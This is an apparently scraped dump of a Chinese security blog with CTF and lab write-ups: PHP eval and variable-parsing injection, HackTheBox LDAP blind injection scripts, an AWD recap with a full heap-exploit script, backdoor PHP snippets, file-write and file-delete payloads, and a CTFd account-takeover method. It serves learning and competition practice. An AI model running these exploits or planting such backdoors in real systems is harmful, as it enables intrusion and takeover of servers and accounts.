首先看一下文档里面是怎么定义复杂解析的 举一个例子容易了解花括号的作用： 12345&lt;?php$test=&quot;hello world!&quot;;echo &quot;$&#123;test&#125;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&#123;$test&#125;&quot;; 输出的结果是： 12hello world!hello world! 另外一个例子： 123&lt;?php$fruit=&quot;apple&quot;;echo &quot;there are many &#123;$fruit&#125;s&quot;; 输出结果： 1there are many apples 结合两个例子可以知道，花括号起到标记变量的界限的作用，在第二个例子中如果没有花括号那么php将会把变量识别为$fruits进而使结果异常。另外也说明php会尽量多地取组合可用的字符作为变量名。 花括号中使用函数，方法，静态类变量和类常量 12345678&lt;?php$Hed9eh0g=&quot;test&quot;;function getname()&#123; echo &quot;Hed9eh0g&quot;; echo &quot;&lt;br&gt;&quot;; return &quot;Hed9eh0g&quot;;&#125;echo &quot;$&#123;getname()&#125;&quot;; 输出结果： 12Hed9eh0gtest 可以看出在双引号包裹的$&#123;&#125;这种形式内部如果有方法名，则这个方法是可以执行的，本例子中首先执行了echo语句，然后再return对应的值Hed9eh0g，与外层形成新的结果​$&#123;Hed9eh0g&#125;，此时php会将其识别为一个变量，然后进行解析并替换成其对应的结果。 如果再在getname()外层包裹一层​$&#123;&#125;，那么结果将会报错，因为根据刚才的推理可知php最终会识别$test为一个变量，而这是一个我们没有定义过的变量。 虽然会报错，但是不影响getname函数的echo语句的执行。 0x02 练习 123456&lt;?phphighlight_file(__FILE__);$str = @(string)$_GET[&#x27;str&#x27;];eval(&#x27;$str = &quot;&#x27;.addslashes($str).&#x27;&quot;;&#x27;);?&gt; 两种payload，分别是：?str=&#123;$&#123;phpinfo()&#125;&#125;和?str=$&#123;$&#123;phpinfo()&#125;&#125; eval函数将字符串当作php代码执行，因此，通过图中代码清晰可见相当于定义了str变量，赋值为一个字符串&#123;$&#123;phpinfo()&#125;&#125;。 $str = &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;，花括号定义了变量的边界，因此该条语句先执行括号中内容，获取函数返回值，并以返回值的string命名变量再赋值给str变量。 并且第二个payload会报一个错误 函数phpinfo，会返回 true，因为 true，是bool类型的变量，然后进行类型转化，转化为字符串1,所以调用的参数就是$1，这也是上面第二个payload报错为Undefined variable: 1的原因。 0x03 继续思考 如果将addslashes 用单引号包裹 123456&lt;?phphighlight_file(__FILE__);$str &#x3D; @(string)$_GET[&#39;str&#39;];eval(&quot;$str &#x3D; &#39;&quot;.addslashes($str).&quot;&#39;;&quot;);?&gt; 再试一下这两个payload &#123;$&#123;phpinfo()&#125;&#125;执行失败 $&#123;$&#123;phpinfo()&#125;&#125;执行成功。 复杂变量解析的前提是双引号包裹,第二次实验中，addslashes函数部分被单引号包裹，所以只是简单的字符串，但是前面$str却是被双引号包裹，所以可以进行复杂变量解析。 那么payload1的&#123;$&#123;phpinfo()&#125;&#125;和payload2的​$&#123;$&#123;phpinfo()&#125;&#125;看样子都可以进行解析之后执行函数？但事实上却只有payload2可以实现。问题出在哪？ 这里注意了，​$str此时是左值，也即位于赋值语句的左侧，而左值必须得是一个变量，也即必须由字符$开头，显然payload1的开头字符是{，因此它压根不是一个变量，此时前面我们所谈的变量解析的特性都没有用。 0x04 参考文章 AD攻防实验室 https://www.anquanke.com/post/id/176331#h2-4","tags":[{"name":"Web安全基础","slug":"Web安全基础","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHP变量解析","slug":"PHP变量解析","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/"}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"Web安全/基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::CTF_walkthrough","date":"2020-07-11T13:10:03.000Z","path":"Target_drone/HackTheBox/17.HTB-CTF-walkthrough/","text":"HackTheBox::CTF Walkthrough 0x01 Info Card Column Details Name CTF IP 10.10.10.122 Points 50 OS Linux Difficulty Insane Creator 0xEA31 0x02 Tools and Tips Python Scripting LDAP Injection Wildcard and Symlink abuse 0x03 Initial Enumeration Nmap 123456789101112131415# Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122Nmap scan report for ctf.htb (10.10.10.122)Host is up (1.8s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)| 256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)|_ 256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds 查看80端口 大概的意思就是让我们尝试去登录这个系统，但是不能用SQLmap或者Dirbuster去暴力猜解用户名和密码。 再去登录界面看一下： 提示我们是一个OTP，及One Time Password，一般而言是1分钟更新一次。 查看源码，发现有一个Hint 如果比较熟悉LDAP的话，这里的两个名词schema和attribute已经提示了是关于LDAP注入。 靶机作者用一个已知的属性去存储了81位的token string，Google搜一下token string (81 digits)。 https://www.systutorials.com/docs/linux/man/1-stoken/ 可以看到一个关键的地方，Pure numeric (81-digit) &quot;ctf&quot; (compressed token format) strings，和靶机的题目相契合，现在就有一点思路了，应该要去找到这个81位纯数字的token，然后用stoken工具去生成OTP。现在就主要是找到token，唯一可以利用的就是这个登录框了。 先随便用某个用户名和密码登录admin:1234 返回User admin not found，再用SQL注入的万能密码试一试 直接是没有任何显示，应该是对一些特殊字符有黑名单过滤。Fuzz一下过滤了一些什么字符 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php –hw 233 代表过滤掉形如User xxx not found的返回信息。 我们发现+和&amp;返回的是232 Words，但是在页面测试一下 发现返回的还是User + not found或者User &amp; not found，这样的话应该是233 Words，而不是Wfuzz返回的232 Words。 我们尝试把这些特殊字符二次URL编码，看Web应用是否还能解析，用seclists中的doble_uri_hex.txt作为字典 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php 最后Fuzz出来的被过滤的字符就是 12345%2500 ---&gt; %00%2528 ---&gt; (%2529 ---&gt; )%252a ---&gt; *%255c ---&gt; \\ 这些被过滤的字符就是LDAP注入需要过滤的所有字符，再结合login.php页面源代码中的hint，可以确定是LDAP注入。 0x04 Getting User Access 先来看LDAP注入的最基本形式 1234(&amp; (password&#x3D;1234) (uid&#x3D;ca01h%00)) 具体到这个靶机的话，我们需要猜解括号的个数。运用类似盲注的思想，如果注入成功，那么就会返回User ca01h not found。 假设只有一个括号： 假设有两个括号： 假设有三个括号： 当尝试到三个括号用于闭合时，成功返回了User ca01h%29%29%29%00 not found，那么这个登录框的LDAP查询的基本形式就是 123456789(&amp; (&amp; (password&#x3D;1234) (uid&#x3D;ca01h)))%00 ) (&amp;| (other comparing) )) 接着，我们再回头去看一下Fuzz出来的被过滤的字符，其中%25%2a返回的消息长度为231 Words 发现回显的消息是Cannot login，说明可以用*通配符来盲注用户名，脚本如下： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python3### username_burp.pyimport sysimport timefrom string import ascii_lowercasefrom urllib.parse import quote_plusimport requestsURL = &#x27;http://10.10.10.122/login.php&#x27;username, done = &#x27;&#x27;, Falseprint()while not done: for c in ascii_lowercase: payload = username + c + quote_plus(&#x27;*&#x27;) data = &#123; &#x27;inputUsername&#x27;: payload, &#x27;inputOTP&#x27;: &#x27;1234&#x27; &#125; resp = requests.post(URL, data=data) if &#x27;Cannot login&#x27; in resp.text: username += c break sys.stdout.write(f&#x27;\\r&#123;username&#125;&#123;c&#125;&#x27;) time.sleep(0.2) else: done = Trueprint(f&#x27;[+] Username: &#123;username&#125; \\n&#x27;) 用户名为ldapuser 知道了用户名之后，我们就要去获取生成OTP的81位token，通过页面源代码的提示，这个token存储在某一个LDAP默认已经存在的属性当中。而默认的属性可以在PayloadsAllTheThings中找到： 123456789101112131415161718192021222324252627ccncocommonNamedcfacsimileTelephoneNumbergivenNamegnhomePhoneidjpegPhotolmailmobilenameoobjectClassouownerpagerpasswordsnstsurnameuidusernameuserPassword 如果不想写脚本的话用wfuzz来Fuzz靶机的LDAP中存在的属性可能会更快一些，但还是要先找到注入的形式： 12345678910(&amp; (&amp; (password&#x3D;1234) (uid&#x3D;ldapuser) (FUZZ&#x3D;*) ) (&amp;| (other comparing) )) 此外还要把注入的字符ldapuser)(FUZZ=*进行二次URL编码，编码之后的结果ldapuser%2529%2528FUZZ%253d%252a。 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php 我们Fuzz出来了这么些属性是存在于靶机的LDAP服务中的，现在的工作就是一个一个的属性来猜解，属于一些重复性的工作，就不在这里过多赘述了，最后可以找到token是存储于pager属性中。接着写脚本burp81位token 1234567891011121314151617181920212223242526272829#!/usr/bin/python3# pager_burp.pyimport requestsimport sysfrom time import sleepfrom string import digitstoken = &quot;&quot;URL = &quot;http://10.10.10.122/login.php&quot;attribute = &quot;pager&quot;loop = 1while loop &gt; 0: for digit in digits: token = token # ldapuser)(pager=&lt;token&gt;)* payload = f&quot;ldapuser%29%28&#123;attribute&#125;%3d&#123;token&#125;&#123;digit&#125;%2a&quot; data = &#123;&quot;inputUsername&quot;: payload, &quot;inputOTP&quot;: &quot;1234&quot;&#125; r = requests.post(URL, data=data) sys.stdout.write(f&quot;\\rToken: &#123;token&#125;&#123;digit&#125;&quot;) sleep(0.5) if b&quot;Cannot login&quot; in r.content: token += digit break elif digit == &quot;9&quot;: loop = 0 breakprint(f&#x27;[+] Token: &#123;token&#125; \\n&#x27;) 这里值得注意的是需要删掉最后的一个9，所以最后的token就是： 1285449490011357156531651545652335570713167411445727140604172141456711102716717000 接着用stoken工具导入token 生成OTP 成功登录后，跳转到page.php页面，可以执行命令 但是提示我们ldapuser权限不够不能执行命令，这里有两种办法： 对group属性进行注入，即把后面group属性的filter截断 12345678910(&amp; (&amp; (pager&#x3D;&lt;token&gt;) (uid&#x3D;ldapuser)))%00 ) (| (group&#x3D;root) (group&#x3D;adm) )) 使用*通配符作为用户名登录 这里演示一下第一种方案，payload直接放到burp中 1ldapuser%2529%2529%2529%2500 再去执行ls命令 读取page.php文件： SSH登录：fdapuser:e398e27d5c4ad45086fe431120932a01","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"}]},{"title":"星盟6月AWD复盘——web+pwn","date":"2020-07-04T04:32:33.000Z","path":"Web_security/ctf_writeup/18.星盟6月AWD复盘——web+pwn/","text":"星盟6月AWD复盘——web+pwn PWN由队内gamous师傅和remila师傅撰写 PWN PWN1 ida没法反编译，造成了很大的困扰，可以看到有选项1有一个明显的栈溢出，而且直接输出的话也有残留指针，但只有一次机会，提高了利用难度，修复的话直接把read的值改了 game是patch两次game的elf之后设置权限执行，直接把patch的赋值nop掉了 然后是一个notepad，堆上常见的玩法 没能及时写出exp且花了太多时间在这题上 在notepad上delte_mark有一个uaf,脚本上show_mark的函数一直写错成delte_mark没注意到，错过了一堆flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import *sh = process(&#x27;./pwn&#x27;)context.log_level = &#x27;debug&#x27;#gdb.attach(sh)sh.recvuntil(&#x27;Your option:&#x27;)sh.sendline(&#x27;3&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = elf.libcdef new(size, content1, content2): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;new&#x27;) sh.recvuntil(&#x27;-&gt; note size:&#x27;) sh.sendline(str(size)) sh.recvuntil(&#x27;-&gt; note name:&#x27;) sh.sendline(content1) sh.recvuntil(&#x27;-&gt; note content:&#x27;) sh.sendline(content2)def edit(idx, content1, content2): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;edit&#x27;) sh.recvuntil(&#x27;-&gt; note index:&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;-&gt; note name:&#x27;) sh.sendline(content1) sh.recvuntil(&#x27;-&gt; note content:&#x27;) sh.sendline(content2)def delete(idx): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;delete&#x27;) sh.recvuntil(&#x27;-&gt; note index:&#x27;) sh.sendline(str(idx))def show(idx): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;show&#x27;) sh.recvuntil(&#x27;-&gt; note index:&#x27;) sh.sendline(str(idx))def mark(idx, content): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;mark&#x27;) sh.recvuntil(&#x27;-&gt; index of note you want to mark:&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;-&gt; mark info:&#x27;) sh.sendline(content)def edit_mark(idx, content): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;edit_mark&#x27;) sh.recvuntil(&#x27;-&gt; mark index:&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;-&gt; mark content:&#x27;) sh.sendline(content)def show_mark(idx): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;show_mark&#x27;) sh.recvuntil(&#x27;-&gt; mark index:&#x27;) sh.sendline(str(idx))def delete_mark(idx): sh.recvuntil(&#x27;-&gt; &#x27;) sh.sendline(&#x27;delete_mark&#x27;) sh.recvuntil(&#x27;-&gt; mark index:&#x27;) sh.sendline(str(idx))new(0x100, &#x27;aaaaaaa&#x27;, &#x27;aaaaaa&#x27;) #0#gdb.attach(sh)mark(0, &#x27;aaaa&#x27;)delete_mark(0)new(0x10, &#x27;aaaaaa&#x27;, p32(0) * 2 + p32(0x0804BFC4) + p32(0x08048810))#1show_mark(0)libc_base = u32(sh.recvn(4)) - libc.sym[&#x27;puts&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]bin_sh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()edit(1, &#x27;a&#x27;, p32(0) * 2 + p32(bin_sh_addr) + p32(system))show_mark(0)print(hex(libc_base))#gdb.attach(sh)sh.interactive() PWN2 pwn2从难度上比pwn1简单不少，可惜在pwn1上看的太久，没注意pwn2放题，错过了好多白花花的flag 第一个洞 backdoor 利用 输入+1等于0即可执行system unsigned int整数上溢即可达到0 1234p=remote(ip,port)p.sendline(str(4294967295))p.sendline(&quot;/bin/sh&quot;)p.sendline(&quot;cat flag&quot;) 修复 改case的值或者nop掉system都可 第二个洞 delete_order 利用 free后没有置NULL肯定是UAF 修复 简单粗暴nop掉free了 当然正确做法应该是jmp出去用补上置NULL的过程 第三个洞 comment 123456789puts(&quot;Size:&quot;);scanf(&quot;%d&quot;, &amp;v1);buf = malloc(v1);puts(&quot;Your name:&quot;);read(0, buf, v1);write(1, buf, v1);puts(&quot;Comments:&quot;);scanf(&quot;%s&quot;, &amp;format);printf(&amp;format); 利用 格式化字符串 修复 用puts替代printf避免格式化解析 第四个洞 order 12345678910puts(&quot;Your name:&quot;);buf = malloc(0x10uLL);read(0, buf, 0x10uLL);puts(&quot;Size:&quot;);scanf(&quot;%d&quot;, &amp;size);if ( (unsigned int)size &lt;= 0x50 )&#123; puts(&quot;Baozi name:&quot;); v5 = malloc((unsigned int)size); scanf(&quot;%s&quot;, v5) 利用 使用scanf(&quot;%s&quot;,&amp;x)的方式读入字符串，存在溢出 堆溢出 修复 nop！ 正确做法应该是jmp出去用fgets或者read替代读入有限长度的字符串 WEB web1 链接：https://pan.baidu.com/s/1JPDSOLIH13nJfsx-8YScvA 提取码：9nln web1留下来的版本是我修复之后，有的漏洞不太能想的起来。。 预留后门 后门1 1234567// admin/header.php&lt;?php $p=$_GET[&#x27;p&#x27;]; echo $p; $q=exec($p); var_dump($q);?&gt; 后门2 12345678// admin/footer.php&lt;?php $shell=$_POST[&#x27;shell&#x27;]; system($shell); if($shell !=&quot;&quot;)&#123; exit(); &#125;?&gt; 后门3 12345678// footer.php&lt;?php $shell=$_POST[&#x27;shell&#x27;]; system($shell); if($shell !=&quot;&quot;)&#123; exit(); &#125;?&gt; SQL注入 123456789101112// search.php&lt;?php include &#x27;header.php&#x27;; include_once(&#x27;config.php&#x27;); if (!empty($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $query = &quot;SELECT * FROM news WHERE id=$id&quot;; $data = mysqli_query($dbc,$query); &#125; $com = mysqli_fetch_array($data); var_dump($com);?&gt; 修复： 12345$filter = &quot;regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\\&amp;|\\*|\\.|-&quot;;if((preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$id)== 1))&#123; die();&#125; 反序列化 这个比赛的时候时间比较紧张，感觉反序列化的参数是不可控的，结束后复盘感觉应该可以结合上面的SQL注入漏洞一起利用，先删除news表原有的记录，然后插入反序列化后的字符串，可以造成任意文件读取。 12345678910111213141516171819202122232425// contact.php&lt;?php class Test &#123; public $f = &quot;index.php&quot;; public $g = &quot;fi&quot;; public $h = &quot;le&quot;; public $i = &quot;_g&quot;; public $j = &quot;et_c&quot;; public $k = &quot;ont&quot;; public $l = &quot;ents&quot;; public function __wakeup() &#123; $qw=$this-&gt;g . $this-&gt;h . $this-&gt;i . $this-&gt;j . $this-&gt;k . $this-&gt;l; var_dump($qw($this-&gt;f)); &#125;&#125; $e = &quot;un&quot;; $f = &quot;se&quot;; $g = &quot;ri&quot;; $h = &quot;al&quot;; $i = &quot;ize&quot;; $query = &quot;SELECT * FROM news;&quot;; $data = mysqli_query($dbc,$query); while($t = mysqli_fetch_array($data)) &#123; $qwe=$e.$f.$g.$h.$i; $qwe($t[1]);&#125; ?&gt; 还有一个可疑的点： 12345678910// services.php&lt;?php class User &#123; public $name = &#x27;&#x27;; function __destruct()&#123; eval(&quot;$this-&gt;name&quot;); &#125; &#125; $user = new User; $user-&gt;name = &#x27;&#x27;.$_POST[&#x27;frame&#x27;]; ?&gt; web3 链接：https://pan.baidu.com/s/1AYZftYQ8nQyMHx7-1XSn7g 提取码：vcr0 web1玩的有点心态崩了。。。。 弱口令 1admin&#x2F;admin 文件包含 1&#x2F;example2.php?page&#x3D;flag 预置flag 1234567// core/features/userlist.php$fi = fopen(strrev(&quot;galf/&quot;),&quot;r&quot;);$sss= &quot;&lt;!--&quot;.strrev(base64_encode(fread($fi,256))).&quot;--&gt;&quot;;fclose($fi);.....if (strpos($user_flags,&#x27;s&#x27;) !== false) $th .= &#x27;&lt;td&#x27;.$bg.&#x27;&gt;&#x27;.$sss.&#x27;&lt;/td&gt;&#x27;; payload： 1shows.php?imod&#x3D;userlist&amp;user_flags&#x3D;s 任意文件内容写入 第一处 1234567// inc/wizards.phpforeach ($_REQUEST[&#x27;language&#x27;] as $ks =&gt; $vs)&#123; // a=&gt;1\\&quot;;phpinfo();// // $lang[&quot;a&quot;] = &quot; . str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, &#x27;1\\&quot;;phpinfo();//&#x27;); // $lang[&quot;a&quot;] = &quot;1\\\\&quot;;phpinfo();// fwrite($lx, &#x27;$lang[&quot;&#x27;.$ks.&#x27;&quot;] = &quot;&#x27;.str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, $vs).&#x27;&quot;;&#x27;.&quot;\\n&quot;);&#125; payload： 1&#x2F;index.php?mod&#x3D;wizard&amp;action&#x3D;language&amp;language[a]&#x3D;1\\%22;phpinfo();&#x2F;&#x2F; 第二处 1234567891011// inc/wizards.php$handler = fopen(SERVDIR.&quot;/cdata/rss_config.php&quot;, &quot;w&quot;) or msg(&quot;error&quot;, lang(&#x27;Error!&#x27;), &quot;Can not open file ./cdata/rss_config.php&quot;);fwrite($handler, &quot;&lt;?PHP \\n\\n//RSS Configurations (Auto Generated file)\\n\\n&quot;);fwrite($handler, &quot;\\$rss_news_include_url = \\&quot;&quot;.htmlspecialchars($rss_news_include_url).&quot;\\&quot;;\\n\\n&quot;);fwrite($handler, &quot;\\$rss_title = \\&quot;&quot;.htmlspecialchars($rss_title).&quot;\\&quot;;\\n\\n&quot;);fwrite($handler, &quot;\\$rss_encoding = \\&quot;&quot;.htmlspecialchars($rss_encoding).&quot;\\&quot;;\\n\\n&quot;);fwrite($handler, &quot;\\$rss_language = \\&quot;&quot;.htmlspecialchars($rss_language).&quot;\\&quot;;\\n\\n&quot;);fwrite($handler, &quot;?&gt;&quot;);fclose($handler); payload： 123456789101112131415161718192021&#x2F;index.php?mod&#x3D;wizard&amp;action&#x3D;dosaverss&amp;rss_news_url&#x3D;http:&#x2F;&#x2F;example.com&amp;rss_title&#x3D;assert&amp;rss_encode&#x3D;$_GET[1]&amp;rss_language&#x3D;$&#123;rss_title($rss_encode)&#125;&#96;&#96;&#96;&#96;#### 任意文件删除&#96;&#96;&#96;php&#x3D;&#x2F;&#x2F; inc&#x2F;images.phpelseif ($action &#x3D;&#x3D; &quot;doimagedelete&quot;)&#123; CSRFCheck(); if(!isset($images)) msg(&quot;info&quot;, lang(&quot;No Images selected&quot;), lang(&quot;You must select images to be deleted&quot;), &#39;#GOBACK&#39;); foreach ($images as $image) unlink(SERVDIR.&quot;&#x2F;uploads&#x2F;&quot;.$image) or print(lang(&quot;Could not delete image&quot;).&quot; &lt;b&gt;$file&lt;&#x2F;b&gt;&quot;); msg(&quot;info&quot;, lang(&quot;Image(s) Deleted&quot;), lang(&quot;The image was successfully deleted&quot;), &#39;#GOBACK&#39;);&#125; payload: 1&#x2F;index.php?mod&#x3D;iamges&amp;action&#x3D;doimagedelete&amp;images[1]&#x3D;..&#x2F;index.php","tags":[{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/tags/ctf/"}],"categories":[{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/categories/ctf/"}]},{"title":"buuctf刷题——渗透测试篇","date":"2020-07-04T04:32:03.000Z","path":"Web_security/ctf_writeup/16.buuctf刷题——渗透测试篇/","text":"BUUCTF——渗透测试篇 GKCTF2020 老八小超市儿 考点 弱口令登录 shopxo1.8.0 后台RCE 解题 没去想后台地址弱密码还是经验太少了 然后就是看传文件点，传个shell上去 但是文件具体在哪又找了半天 如果传在默认主题zip的default/__static__/shell.php 那么访问路由应该是下面这样 1&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;shell.php getshell完了，根据提示，去找生成的脚本（因为这个脚本是由root权限+定时执行的） 改造下这个脚本，反弹shell或者直接执行cat命令，就拿到root权限了。 BJDCTF 2nd Schrödinger 考点 奇怪的考点 解题 打开题目有一个test.php，是一个需要登录的网页，爆破的target应该就是这个test.php 并且Forecast success rate是根据JS代码来生成的，发现爆破很慢，抓包查看发现有个cookie是base64加密，解码之后很像时间戳，直接清空看看效果，发现直接99%，点击check，弹出来Bilibili的AV号。 根据时间查看评论得到flag。 我还以为要去看北京大学 量子力学的视频呢 V&amp;N HappyCTFd 考点 CTFd 1day 解题 考察的是CTFd v2.0.0 – v2.2.2 account takeover 可以直接看这篇分析：https://www.colabug.com/2020/0204/6940556/amp/ 利用过程： 先在buuoj注册个邮箱 利用首尾添加空格绕过限制来注册一个与受害者用户名相同的账号 找回密码链接发送到自己的邮箱 修改自己账号的用户名（与受害者不同） 点击重置密码链接，设置新密码 BJDCTF 2nd elementmaster 考点 想象力 解题 这道题真的有点脑洞大开了。。。。 打开题目有两个hide标签，id很可疑，感觉是Hex编码，用工具转换成ASCII拼接后是Po.php。 这里就要知道Po是一个化学元素，再结合题目和图片，把所有的化学元素都给遍历一遍。直接看别人的WP，脚本如下： 1234567891011121314151617181920# coding=utf-8import requestsperiodic_table = (&#x27;H&#x27;, &#x27;He&#x27;, &#x27;Li&#x27;, &#x27;Be&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;F&#x27;, &#x27;Ne&#x27;, &#x27;Na&#x27;, &#x27;Mg&#x27;, &#x27;Al&#x27;, &#x27;Si&#x27;, &#x27;P&#x27;, &#x27;S&#x27;, &#x27;Cl&#x27;, &#x27;Ar&#x27;, &#x27;K&#x27;, &#x27;Ca&#x27;, &#x27;Sc&#x27;, &#x27;Ti&#x27;, &#x27;V&#x27;, &#x27;Cr&#x27;, &#x27;Mn&#x27;, &#x27;Fe&#x27;, &#x27;Co&#x27;, &#x27;Ni&#x27;, &#x27;Cu&#x27;, &#x27;Zn&#x27;, &#x27;Ga&#x27;, &#x27;Ge&#x27;, &#x27;As&#x27;, &#x27;Se&#x27;, &#x27;Br&#x27;, &#x27;Kr&#x27;, &#x27;Rb&#x27;, &#x27;Sr&#x27;, &#x27;Y&#x27;, &#x27;Zr&#x27;, &#x27;Nb&#x27;, &#x27;Mo&#x27;, &#x27;Te&#x27;, &#x27;Ru&#x27;, &#x27;Rh&#x27;, &#x27;Pd&#x27;, &#x27;Ag&#x27;, &#x27;Cd&#x27;, &#x27;In&#x27;, &#x27;Sn&#x27;, &#x27;Sb&#x27;, &#x27;Te&#x27;, &#x27;I&#x27;, &#x27;Xe&#x27;, &#x27;Cs&#x27;, &#x27;Ba&#x27;, &#x27;La&#x27;, &#x27;Ce&#x27;, &#x27;Pr&#x27;, &#x27;Nd&#x27;, &#x27;Pm&#x27;, &#x27;Sm&#x27;, &#x27;Eu&#x27;, &#x27;Gd&#x27;, &#x27;Tb&#x27;, &#x27;Dy&#x27;, &#x27;Ho&#x27;, &#x27;Er&#x27;, &#x27;Tm&#x27;, &#x27;Yb&#x27;, &#x27;Lu&#x27;, &#x27;Hf&#x27;, &#x27;Ta&#x27;, &#x27;W&#x27;, &#x27;Re&#x27;, &#x27;Os&#x27;, &#x27;Ir&#x27;, &#x27;Pt&#x27;, &#x27;Au&#x27;, &#x27;Hg&#x27;, &#x27;Tl&#x27;, &#x27;Pb&#x27;, &#x27;Bi&#x27;, &#x27;Po&#x27;, &#x27;At&#x27;, &#x27;Rn&#x27;, &#x27;Fr&#x27;, &#x27;Ra&#x27;, &#x27;Ac&#x27;, &#x27;Th&#x27;, &#x27;Pa&#x27;, &#x27;U&#x27;, &#x27;Np&#x27;, &#x27;Pu&#x27;, &#x27;Am&#x27;, &#x27;Cm&#x27;, &#x27;Bk&#x27;, &#x27;Cf&#x27;, &#x27;Es&#x27;, &#x27;Fm&#x27;, &#x27;Md&#x27;, &#x27;No&#x27;, &#x27;Lr&#x27;, &#x27;Rf&#x27;, &#x27;Db&#x27;, &#x27;Sg&#x27;, &#x27;Bh&#x27;, &#x27;Hs&#x27;, &#x27;Mt&#x27;, &#x27;Ds&#x27;, &#x27;Rg&#x27;, &#x27;Cn&#x27;, &#x27;Nh&#x27;, &#x27;Fl&#x27;, &#x27;Mc&#x27;, &#x27;Lv&#x27;, &#x27;Ts&#x27;, &#x27;Og&#x27;, &#x27;Uue&#x27;)url = &quot;http://5fd398b5-f94f-4f8a-b379-797755b20891.node3.buuoj.cn/&quot;result = &quot;&quot;for element in periodic_table: req = requests.get(url + element + &quot;.php&quot;) if req.status_code != requests.codes.ok: continue result += req.textprint(result) 跑出来的字符串拼接成一个文件名，打开即是flag。","tags":[{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/tags/ctf/"}],"categories":[{"name":"ctf","slug":"ctf","permalink":"http://ca0y1h.top/categories/ctf/"},{"name":"渗透测试","slug":"ctf/渗透测试","permalink":"http://ca0y1h.top/categories/ctf/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"2020“第五空间”智能安全大赛线上赛CTF-Web复盘","date":"2020-07-01T12:14:15.000Z","path":"Web_security/ctf_writeup/21.2020第五空间智能安全大赛线上赛CTF-Web/","text":"2020“第五空间”智能安全大赛线上赛CTF Web复盘 hate-php [Solved] 考点 无字母webshell 解题 1234567891011121314151617&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;code&#x27;]))&#123; highlight_file(__FILE__);&#125;else&#123; $code = $_GET[&#x27;code&#x27;]; if (preg_match(&#x27;/(f|l|a|g|\\.|p|h|\\/|;|\\&quot;|\\&#x27;|\\`|\\||\\[|\\]|\\_|=)/i&#x27;,$code)) &#123; 